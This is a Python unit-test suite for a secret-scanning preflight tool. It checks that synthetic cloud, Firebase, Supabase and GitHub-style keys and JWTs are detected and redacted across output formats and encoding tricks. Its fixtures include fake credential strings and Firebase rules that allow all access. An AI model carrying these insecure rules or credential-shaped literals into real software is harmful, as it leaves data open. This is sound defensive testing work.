from __future__ import annotations

import base64
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import random
import shutil
import subprocess
import sys
import tempfile
import time
import types
import unicodedata
import unittest
from unittest import mock
from urllib.parse import quote, unquote


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
SCANNER = REPOSITORY_ROOT / "skill" / "vibeworthy" / "scripts" / "preflight.py"


def load_scanner_module() -> types.ModuleType:
    module_name = "vibeworthy_preflight_test_module"
    specification = importlib.util.spec_from_file_location(module_name, SCANNER)
    if specification is None or specification.loader is None:
        raise RuntimeError("scanner module could not be loaded")
    module = importlib.util.module_from_spec(specification)
    sys.modules[module_name] = module
    specification.loader.exec_module(module)
    return module


def make_root_guard(scanner: types.ModuleType, root: Path, *, root_is_file: bool = False) -> object:
    resolved = root.resolve(strict=True)
    return scanner.RootGuard(
        resolved,
        resolved,
        scanner._path_identity(scanner.os.lstat(resolved)),
        root_is_file,
    )


def synthetic_cloud_key() -> str:
    return ("AK" + "IA") + ("Q" * 16)


def synthetic_firebase_key() -> str:
    return ("AI" + "za") + ("A" * 35)


def synthetic_supabase_key(kind: str) -> str:
    return "sb_" + kind + "_" + ("b" * 28)


def synthetic_jwt(role: str) -> str:
    def segment(value: dict[str, str]) -> str:
        encoded = base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode("utf-8"))
        return encoded.decode("ascii").rstrip("=")

    return ".".join((segment({"alg": "HS256", "typ": "JWT"}), segment({"role": role}), "signaturesegment"))


def tree_digest(root: Path) -> dict[str, tuple[str, str]]:
    result: dict[str, tuple[str, str]] = {}
    for current, directories, files in os.walk(root, topdown=True, followlinks=False):
        directories.sort()
        files.sort()
        current_path = Path(current)
        for name in list(directories) + files:
            path = current_path / name
            relative = path.relative_to(root).as_posix()
            if path.is_symlink():
                result[relative] = ("symlink", os.readlink(path))
            elif path.is_file():
                result[relative] = ("file", hashlib.sha256(path.read_bytes()).hexdigest())
            elif path.is_dir():
                result[relative] = ("directory", "")
    return result


class RepositoryFixture:
    def __init__(self, case: unittest.TestCase, *, git: bool = True) -> None:
        self._temporary = tempfile.TemporaryDirectory()
        case.addCleanup(self._temporary.cleanup)
        self.base = Path(self._temporary.name)
        self.root = self.base / "project"
        self.root.mkdir()
        if git:
            subprocess.run(
                ["git", "init", "-q", str(self.root)],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=True,
            )

    def write(self, relative: str, content: str | bytes) -> Path:
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")
        return path

    def track(self, *relative_paths: str, force: bool = False) -> None:
        command = ["git", "add"]
        if force:
            command.append("--force")
        command.extend(("--", *relative_paths))
        subprocess.run(
            command,
            cwd=self.root,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )


class PreflightTests(unittest.TestCase):
    maxDiff = None

    def run_scanner(
        self,
        target: Path,
        output_format: str = "json",
        *extra: str,
        environment_overrides: dict[str, str] | None = None,
    ) -> subprocess.CompletedProcess[str]:
        environment = os.environ.copy()
        environment["PYTHONDONTWRITEBYTECODE"] = "1"
        if environment_overrides:
            environment.update(environment_overrides)
        return subprocess.run(
            [
                sys.executable,
                "-I",
                str(SCANNER),
                str(target),
                "--format",
                output_format,
                *extra,
            ],
            cwd=REPOSITORY_ROOT,
            env=environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=20,
        )

    def json_report(self, completed: subprocess.CompletedProcess[str]) -> dict[str, object]:
        self.assertEqual("", completed.stderr)
        return json.loads(completed.stdout)

    def test_req_010_all_formats_are_parseable_deterministic_and_read_only(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "# Synthetic clean project\n")
        fixture.track("README.md")
        before = tree_digest(fixture.root)

        first_json = self.run_scanner(fixture.root, "json")
        second_json = self.run_scanner(fixture.root, "json")
        text = self.run_scanner(fixture.root, "text")
        sarif = self.run_scanner(fixture.root, "sarif")

        self.assertEqual(0, first_json.returncode)
        self.assertEqual(first_json.stdout, second_json.stdout)
        report = self.json_report(first_json)
        self.assertEqual("1.0", report["schema_version"])
        self.assertEqual(0, report["exit_code"])
        self.assertEqual("none", report["release_assertion"])
        self.assertFalse(report["scope"]["git_history_scanned"])
        self.assertFalse(report["scope"]["submodules_scanned"])
        self.assertFalse(report["scope"]["atomic_snapshot"])
        self.assertTrue(report["scope"]["release_evidence_requires_quiescent_isolated_checkout"])
        self.assertFalse(report["scope"]["network_used"])
        self.assertFalse(report["scope"]["files_modified"])

        self.assertEqual(0, text.returncode)
        self.assertIn("Git history and submodule contents were not scanned", text.stdout)
        self.assertIn("non-atomic worktree view", text.stdout)
        self.assertIn("it is not GO", text.stdout)
        self.assertEqual("", text.stderr)

        self.assertEqual(0, sarif.returncode)
        sarif_document = json.loads(sarif.stdout)
        self.assertEqual("2.1.0", sarif_document["version"])
        self.assertEqual(0, sarif_document["runs"][0]["invocations"][0]["exitCode"])
        self.assertFalse(
            sarif_document["runs"][0]["invocations"][0]["properties"]["scope"]["atomic_snapshot"]
        )
        self.assertTrue(
            sarif_document["runs"][0]["invocations"][0]["properties"]["scope"][
                "release_evidence_requires_quiescent_isolated_checkout"
            ]
        )
        self.assertEqual(before, tree_digest(fixture.root))

    def test_req_010_text_report_is_ascii_safe_under_ascii_stdout(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        fixture.write("caf\u00e9/config.js", f'const firebaseApiKey = "{firebase}";\n')

        completed = self.run_scanner(
            fixture.root,
            "text",
            environment_overrides={"PYTHONIOENCODING": "ascii"},
        )

        self.assertEqual(0, completed.returncode, completed.stderr)
        self.assertIn("VW-FIREBASE-PUBLIC-API-KEY", completed.stdout)
        self.assertIn(r"caf\xe9/config.js", completed.stdout)
        self.assertNotIn(firebase, completed.stdout)
        completed.stdout.encode("ascii", "strict")

    def test_req_007_matched_secret_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = synthetic_cloud_key()
        assignment_name = "access" + "_token"
        fixture.write("config.txt", f'{assignment_name} = "{synthetic_value}"\n')
        fixture.track("config.txt")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, completed.stderr)
                self.assertIn("VW-SECRET-CLOUD-ACCESS-KEY", completed.stdout)
                self.assertIn("config.txt", completed.stdout)
                self.assertIn("rotate", completed.stdout.lower())

    def test_req_007_literal_redaction_marker_cannot_bypass_path_redaction(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "[REDACTED]SyntheticPathCredential12345"
        assignment_name = "pass" + "word"
        fixture.write("config.txt", f'{assignment_name} = "{synthetic_value}"\n')
        fixture.write(synthetic_value, synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, completed.stderr)
                if output_format == "sarif":
                    document = json.loads(completed.stdout)
                    decoded_locations = [
                        unquote(location["physicalLocation"]["artifactLocation"]["uri"])
                        for result in document["runs"][0]["results"]
                        for location in result.get("locations", [])
                    ]
                    self.assertTrue(
                        all(synthetic_value not in location for location in decoded_locations)
                    )

    def test_req_007_secret_like_filename_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "!DUMMY_SECRET_VALUE_123"
        filename = f"token={synthetic_value}"
        fixture.write(filename, f"token={synthetic_value}\n")
        fixture.write(
            "password" + ("A" * 129) + f"={synthetic_value}.txt",
            f"password={synthetic_value}\n",
        )

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, completed.stderr)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_specialized_secret_filenames_are_redacted_in_every_format(self) -> None:
        cases = (
            ("NEXT_PUBLIC_ADMIN_KEY", "VW-CLIENT-PRIVILEGED-CREDENTIAL"),
            ("SUPABASE_SERVICE_ROLE_KEY", "VW-SUPABASE-PRIVILEGED-KEY"),
        )
        for variable_name, rule_id in cases:
            with self.subTest(variable_name=variable_name):
                fixture = RepositoryFixture(self)
                synthetic_value = "!PrivilegedSyntheticValue123456789"
                long_variable_name = (
                    "NEXT_PUBLIC_" + ("A" * 129) + "ADMIN_KEY"
                    if variable_name == "NEXT_PUBLIC_ADMIN_KEY"
                    else "SUPABASE_" + ("A" * 129) + "_SERVICE_ROLE_KEY"
                )
                fixture.write(
                    f"{variable_name}={synthetic_value}",
                    f"{variable_name}={synthetic_value}\n",
                )
                fixture.write(
                    f"{variable_name}=/{synthetic_value}",
                    f"{variable_name}={synthetic_value}\n",
                )
                fixture.write(
                    f"{long_variable_name}={synthetic_value}.txt",
                    f"{variable_name}={synthetic_value}\n",
                )

                for output_format in ("text", "json", "sarif"):
                    with self.subTest(output_format=output_format):
                        completed = self.run_scanner(fixture.root, output_format)
                        self.assertEqual(1, completed.returncode)
                        self.assertNotIn(synthetic_value, completed.stdout)
                        self.assertNotIn(synthetic_value, completed.stderr)
                        self.assertIn(rule_id, completed.stdout)
                        self.assertIn("REDACTED", completed.stdout)

    def test_req_007_detected_content_values_cannot_leak_through_other_paths(self) -> None:
        fixture = RepositoryFixture(self)
        values = ("FirstCorrelatedCredential12345", "SecondCorrelatedCredential67890")
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write("config.env", f"password={values[0]}\nNEXT_PUBLIC_ADMIN_KEY={values[1]}\n")
        fixture.write(f"artifact-{values[0]}.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')
        fixture.write(f"artifact-{values[1]}.js", f'const firebaseApiKey = "{firebase}";\n')

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                for value in values:
                    self.assertNotIn(value, completed.stdout)
                self.assertIn("REDACTED", completed.stdout)
        report = self.json_report(self.run_scanner(fixture.root))
        warnings = [item for item in report["findings"] if item["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"]
        self.assertEqual(2, len(warnings))
        self.assertEqual(1, sum(item["suppressed"] for item in warnings))
        self.assertEqual(2, len({item["path"] for item in warnings}))

    def test_req_007_overlapping_content_values_redact_the_full_longest_span(self) -> None:
        scanner = load_scanner_module()
        short_value = "ShortCredential123"
        long_value = ("VisiblePrefix" * 7) + short_value + "Z"
        candidate = scanner.Candidate(Path("unused"), long_value, None)

        redacted = scanner._redact_content_values_from_paths(
            [candidate],
            [long_value, short_value],
        )

        self.assertEqual("[REDACTED]", redacted[0].display_path)
        self.assertNotIn("VisiblePrefix", redacted[0].display_path)
        self.assertNotIn(short_value, redacted[0].display_path)

    def test_req_007_canonically_equivalent_unicode_path_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        composed = "éSecretCredential12345"
        decomposed = unicodedata.normalize("NFD", composed)
        assignment_name = "NEXT_PUBLIC_" + "ADMIN_KEY"
        fixture.write("config.env", f"{assignment_name}={composed}\n")
        fixture.write(decomposed, synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                normalized_output = unicodedata.normalize("NFC", unquote(completed.stdout))
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(composed, normalized_output)
                self.assertNotIn(decomposed, completed.stdout)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_percent_encoded_secret_path_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "Synthetic/Secret:Value@987654321"
        assignment_name = "pass" + "word"
        encoded_name = "Synthetic%2FSecret%3AValue%40987654321.txt"
        double_encoded_name = encoded_name.replace("%", "%25")
        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
        fixture.write(encoded_name, synthetic_cloud_key() + "\n")
        fixture.write(double_encoded_name, synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                decoded_once = unquote(completed.stdout)
                decoded_twice = unquote(decoded_once)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, decoded_once)
                self.assertNotIn(synthetic_value, decoded_twice)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_loose_provider_token_is_redacted_from_encoded_paths(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "ghp_" + ("A" * 36)
        encoded_name = synthetic_value.replace("_", "%5F")
        fixture.write("evidence.txt", synthetic_value + "\n")
        fixture.write(encoded_name, synthetic_cloud_key() + "\n")
        fixture.write(encoded_name.replace("%", "%25"), synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                decoded = completed.stdout
                for _round in range(3):
                    self.assertNotIn(synthetic_value, decoded)
                    decoded = unquote(decoded)
                self.assertEqual(1, completed.returncode)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_source_escapes_and_path_only_tokens_are_redacted(self) -> None:
        synthetic_value = "ghp_" + ("A" * 36)
        encoded_value = synthetic_value.replace("_", "%5F")
        escaped_values = (
            synthetic_value.replace("_", r"\u005f"),
            synthetic_value.replace("_", r"\uuuu005f"),
            synthetic_value.replace("_", r"\137"),
            synthetic_value.replace("_", r"\N{LOW LINE}"),
        )
        for escaped_value in escaped_values:
            with self.subTest(escaped_value=escaped_value):
                fixture = RepositoryFixture(self)
                fixture.write("config.py", f'token="{escaped_value}"\n')
                fixture.write(encoded_value, synthetic_cloud_key() + "\n")
                for output_format in ("text", "json", "sarif"):
                    completed = self.run_scanner(fixture.root, output_format)
                    decoded = completed.stdout
                    for _round in range(3):
                        self.assertNotIn(synthetic_value, decoded)
                        decoded = unquote(decoded)
                    self.assertEqual(1, completed.returncode)
                    self.assertIn("REDACTED", completed.stdout)

        fixture = RepositoryFixture(self)
        fixture.write(f"{encoded_value}/package.json", "{invalid json\n")
        for output_format in ("text", "json", "sarif"):
            with self.subTest(path_only_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                decoded = completed.stdout
                for _round in range(3):
                    self.assertNotIn(synthetic_value, decoded)
                    decoded = unquote(decoded)
                self.assertEqual(1, completed.returncode)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_renderer_source_escape_closure_cannot_recreate_secret(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self)
        synthetic_value = "ghp_" + ("A" * 36)
        # Percent-encode the backslash so the on-disk fixture is valid on
        # Windows while URI decoding followed by source decoding still
        # reconstructs the protected value.
        source_escaped_name = synthetic_value.replace("_", r"%5Cu005f")
        fixture.write("config.env", f'password="{synthetic_value}"\n')
        fixture.write(source_escaped_name, synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                frontier = {completed.stdout}
                for _round in range(4):
                    next_frontier: set[str] = set()
                    for projection in frontier:
                        normalized = unicodedata.normalize("NFC", projection)
                        self.assertNotIn(synthetic_value, normalized)
                        next_frontier.add(unquote(projection))
                        decoded, _changed = scanner._source_escape_decode_once(projection)
                        next_frontier.add(decoded)
                    frontier = next_frontier
                self.assertIn("REDACTED", completed.stdout)

        near_miss = "ghq" + r"\u005f" + ("A" * 36)
        candidate = scanner.Candidate(
            Path("unused"),
            scanner._safe_display_component(near_miss),
            None,
        )
        redacted = scanner._redact_content_values_from_paths(
            [candidate],
            [synthetic_value],
        )
        self.assertNotEqual("[REDACTED-PATH]", redacted[0].display_path)

    def test_req_007_source_escape_closure_enforces_four_source_layers(self) -> None:
        scanner = load_scanner_module()
        synthetic_value = "ghp_" + ("A" * 36)

        def encoded_display(layer_count: int) -> str:
            encoded = synthetic_value.replace("_", r"\u005f")
            for _layer in range(layer_count - 1):
                encoded = encoded.replace("\\", r"\\")
            return scanner._safe_display_component(encoded)

        bounded_views, _invalid_utf8, bounded_exceeded = (
            scanner._path_projection_closure(encoded_display(4))
        )
        self.assertFalse(bounded_exceeded)
        self.assertIn(synthetic_value, bounded_views)

        _views, _invalid_utf8, excessive = scanner._path_projection_closure(
            encoded_display(5)
        )
        self.assertTrue(excessive)

    def test_req_007_unrelated_invalid_percent_utf8_does_not_fail_closed(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("%FF-unrelated.txt", synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn("path-redaction-limit", completed.stdout)

    def test_req_007_renderer_encoding_cannot_recreate_a_detected_value(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "Synthetic%20PathCredential123"
        assignment_name = "pass" + "word"
        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
        fixture.write("Synthetic PathCredential123", synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                decoded = completed.stdout
                for _round in range(6):
                    self.assertNotIn(synthetic_value, unicodedata.normalize("NFC", decoded))
                    decoded = unquote(decoded)
                self.assertEqual(1, completed.returncode)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_ascii_and_json_escaping_cannot_recreate_a_detected_value(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "\\u0100CredentialPath12345"
        assignment_name = "pass" + "word"
        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
        fixture.write("ĀCredentialPath12345", synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_percent_encoding_beyond_bound_fails_without_locations(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "Layered/SecretCredential123456789"
        assignment_name = "pass" + "word"
        encoded_name = quote(synthetic_value, safe="")
        for _round in range(4):
            encoded_name = quote(encoded_name, safe="")
        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
        fixture.write(encoded_name, synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(2, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(encoded_name, completed.stdout)
                self.assertIn("path-redaction-limit", completed.stdout)
                if output_format == "json":
                    document = json.loads(completed.stdout)
                    self.assertEqual([], document["findings"])
                elif output_format == "sarif":
                    document = json.loads(completed.stdout)
                    self.assertEqual([], document["runs"][0]["results"])

    def test_req_007_invalid_percent_utf8_fails_before_decoder_replacement_leaks(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "�CredentialPath12345"
        assignment_name = "pass" + "word"
        fixture.write("config.env", f'{assignment_name}="{synthetic_value}"\n')
        fixture.write("%FFCredentialPath12345", synthetic_cloud_key() + "\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                decoded = completed.stdout
                for _round in range(3):
                    self.assertNotIn(synthetic_value, decoded)
                    decoded = unquote(decoded)
                self.assertEqual(2, completed.returncode)
                self.assertIn("path-redaction-limit", completed.stdout)

    def test_req_007_raw_values_are_not_deduplicated_by_sanitized_marker(self) -> None:
        scanner = load_scanner_module()
        first = "AKIA" + ("A" * 16)
        second = "AKIA" + ("B" * 16)
        self.assertEqual(
            scanner._safe_display_component(first),
            scanner._safe_display_component(second),
        )
        candidates = [
            scanner.Candidate(Path("unused-a"), f"artifact-{first}", None),
            scanner.Candidate(Path("unused-b"), f"artifact-{second}", None),
        ]

        redacted = scanner._redact_content_values_from_paths(candidates, [first, second])

        self.assertEqual(2, len(redacted))
        self.assertTrue(all("REDACTED" in item.display_path for item in redacted))
        self.assertTrue(all(first not in item.display_path for item in redacted))
        self.assertTrue(all(second not in item.display_path for item in redacted))

    def test_req_007_percent_closure_handles_utf8_case_and_four_layers(self) -> None:
        scanner = load_scanner_module()
        synthetic_value = "é/layeredcredential12345"
        decomposed = unicodedata.normalize("NFD", synthetic_value)
        candidates = []
        for rounds in (1, 2, 4):
            encoded = decomposed
            for _round in range(rounds):
                encoded = quote(encoded, safe="").lower()
            candidates.append(
                scanner.Candidate(
                    Path(f"unused-{rounds}"),
                    f"prefix-{encoded}-%g0-suffix",
                    None,
                )
            )

        redacted = scanner._redact_content_values_from_paths(
            candidates,
            [synthetic_value],
        )

        self.assertEqual(3, len(redacted))
        for candidate in redacted:
            decoded = candidate.display_path
            for _round in range(6):
                self.assertNotIn(
                    synthetic_value,
                    unicodedata.normalize("NFC", decoded),
                )
                decoded = unquote(decoded)

    def test_req_007_path_format_controls_are_escaped_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        format_control = "\u202e"
        firebase = synthetic_firebase_key()
        fixture.write(f"safe{format_control}.js", f'const firebaseApiKey = "{firebase}";\n')

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(0, completed.returncode)
                self.assertNotIn(format_control, completed.stdout)
                self.assertIn("202e", completed.stdout.lower())

    def test_req_011_git_scope_env_and_skip_reasons(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = synthetic_cloud_key()
        fixture.write(".gitignore", ".env.local\n")
        fixture.write(".env", "SAFE_NAME=placeholder\n")
        fixture.write(".env.local", f"IGNORED={synthetic_value}\n")
        fixture.write(".env.example", "TOKEN=placeholder\n")
        fixture.write("src/new.txt", "ordinary untracked source\n")
        fixture.write("vendor/dependency.txt", f"TOKEN={synthetic_value}\n")
        fixture.write("dist/bundle.js", f"TOKEN={synthetic_value}\n")
        fixture.write("asset.bin", b"\x00" + synthetic_value.encode("ascii"))
        fixture.write("large.txt", ("x" * 300) + synthetic_value)
        outside = fixture.base / "outside.txt"
        outside.write_text(f"TOKEN={synthetic_value}\n", encoding="utf-8")
        (fixture.root / "linked.txt").symlink_to(outside)
        fixture.track(".gitignore", ".env.example", "src/new.txt")
        fixture.track(".env", force=True)

        before = tree_digest(fixture.root)
        completed = self.run_scanner(fixture.root, "json", "--max-file-bytes", "128")
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        findings = report["findings"]
        by_rule = {finding["rule_id"]: finding for finding in findings}
        self.assertIn("VW-ENV-TRACKED", by_rule)
        self.assertEqual(".env", by_rule["VW-ENV-TRACKED"]["path"])
        reported_paths = {finding["path"] for finding in findings}
        self.assertNotIn(".env.local", reported_paths)
        self.assertNotIn(".env.example", reported_paths)
        self.assertNotIn("vendor/dependency.txt", reported_paths)
        self.assertNotIn("dist/bundle.js", reported_paths)
        self.assertNotIn("asset.bin", reported_paths)
        self.assertNotIn("large.txt", reported_paths)
        self.assertNotIn("linked.txt", reported_paths)
        skipped = report["summary"]["skipped_by_reason"]
        self.assertGreaterEqual(skipped["binary"], 1)
        self.assertGreaterEqual(skipped["generated-or-vendor"], 2)
        self.assertGreaterEqual(skipped["oversized"], 1)
        self.assertGreaterEqual(skipped["symlink"], 1)
        self.assertNotIn(synthetic_value, completed.stdout)
        self.assertEqual(before, tree_digest(fixture.root))

    def test_req_011_untracked_nonignored_env_is_distinct_from_template(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(".env.production", "VALUE=placeholder\n")
        fixture.write(".env.template", "VALUE=placeholder\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        env_findings = [finding for finding in report["findings"] if finding["rule_id"].startswith("VW-ENV-")]
        self.assertEqual(1, len(env_findings))
        self.assertEqual("VW-ENV-UNIGNORED", env_findings[0]["rule_id"])
        self.assertEqual(".env.production", env_findings[0]["path"])

    @unittest.skipIf(os.name == "nt", "Git magic path fixture uses POSIX filename semantics")
    def test_req_011_git_scope_uses_literal_pathspecs_for_magic_names_and_root(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("root.txt", "ordinary tracked source\n")
        magic_targets = [
            fixture.write(
                f":({magic})scope/config.txt",
                "pass" + f"word=!Synthetic{magic.title()}PathSecret123\n",
            ).parent
            for magic in ("literal", "icase", "glob")
        ]
        fixture.track("root.txt")

        root_completed = self.run_scanner(fixture.root)
        root_report = self.json_report(root_completed)
        self.assertEqual(1, root_completed.returncode)
        self.assertEqual("git-worktree", root_report["scope"]["mode"])
        self.assertEqual(4, root_report["summary"]["files_considered"])

        for magic_target in magic_targets:
            with self.subTest(target=magic_target.name):
                target_completed = self.run_scanner(magic_target)
                target_report = self.json_report(target_completed)
                self.assertEqual(1, target_completed.returncode)
                self.assertEqual([], target_report["tool_errors"])
                self.assertEqual(
                    {"VW-SECRET-GENERIC-ASSIGNMENT"},
                    {finding["rule_id"] for finding in target_report["findings"]},
                )
                self.assertEqual(
                    {"config.txt"},
                    {finding["path"] for finding in target_report["findings"]},
                )

    def test_req_007_long_secret_like_path_remainder_is_fully_redacted(self) -> None:
        scanner = load_scanner_module()
        secret = "!Synthetic" + "PathCredential123456789"
        raw_path = ("segment/" * 500) + f"password=/{secret}/tail.txt"

        self.assertGreater(len(raw_path), 4_000)
        self.assertLessEqual(len(raw_path), 4_096)
        started = time.perf_counter()
        safe_path = scanner._safe_display_component(raw_path)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.0, f"path redaction took {elapsed:.3f}s")
        self.assertNotIn(secret, safe_path)
        self.assertNotIn("tail.txt", safe_path)
        self.assertTrue(safe_path.endswith("password=[REDACTED]"))

        for raw_name in (
            "password" + ("A" * 129) + f"={secret}.txt",
            "NEXT_PUBLIC_" + ("A" * 129) + f"ADMIN_KEY={secret}.txt",
        ):
            with self.subTest(raw_name=raw_name[:24]):
                safe_name = scanner._safe_display_component(raw_name)
                self.assertNotIn(secret, safe_name)
                self.assertIn("[REDACTED]", safe_name)

    def test_req_008_contextual_backend_keys_and_privileged_key(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        publishable = synthetic_supabase_key("publishable")
        privileged = synthetic_supabase_key("secret")
        fixture.write(
            "src/config.ts",
            "\n".join(
                (
                    f'export const firebaseApiKey = "{firebase}";',
                    f'export const supabasePublishable = "{publishable}";',
                    f'const backendCredential = "{privileged}";',
                    "",
                )
            ),
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-FIREBASE-PUBLIC-API-KEY", rule_ids)
        self.assertIn("VW-SUPABASE-PUBLIC-KEY", rule_ids)
        self.assertIn("VW-SUPABASE-PRIVILEGED-KEY", rule_ids)
        self.assertEqual(2, report["summary"]["required_manual_checks"])
        for value in (firebase, publishable, privileged):
            self.assertNotIn(value, completed.stdout)
        firebase_finding = next(
            finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        )
        self.assertIn("external", firebase_finding["message"])
        self.assertIn("unverified", firebase_finding["message"])

    def test_req_008_legacy_supabase_roles_are_classified_without_echoing_jwt(self) -> None:
        fixture = RepositoryFixture(self)
        public_jwt = synthetic_jwt("anon")
        privileged_jwt = synthetic_jwt("service_role")
        fixture.write("keys.txt", f"anon={public_jwt}\nservice={privileged_jwt}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertEqual(
            {"VW-SUPABASE-PUBLIC-KEY", "VW-SUPABASE-PRIVILEGED-KEY"},
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(public_jwt, completed.stdout)
        self.assertNotIn(privileged_jwt, completed.stdout)

    def test_req_008_permissive_firebase_rules_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "rules_version = '2';\nservice cloud.firestore { match /{document=**} { allow read, write: if true; } }\n",
        )
        fixture.write("database.rules.json", '{"rules": {".read": true, ".write": "true"}}\n')
        fixture.write("database-tautology.rules", '{"rules": {".read": "true == true"}}\n')
        fixture.write(
            "storage.rules",
            "service firebase.storage { match /b/{bucket}/o { match /{allPaths=**} { "
            "allow read, write: if\n true; } } }\n",
        )
        fixture.write(
            "tautology.rules",
            "service cloud.firestore { match /{document=**} { allow read: if true == true; } }\n",
        )
        fixture.write(
            "double-negation.rules",
            "service cloud.firestore { match /{document=**} { allow read: if !!true; } }\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"]
        self.assertEqual(6, len(rule_findings))
